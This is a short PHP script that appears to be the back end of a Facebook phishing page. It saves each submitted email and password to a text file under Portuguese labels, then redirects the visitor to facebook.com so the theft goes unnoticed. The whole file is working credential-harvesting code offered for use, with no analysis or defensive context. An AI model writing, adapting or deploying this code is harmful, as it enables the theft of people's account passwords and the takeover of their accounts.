<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['login_email'] . " Senha: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
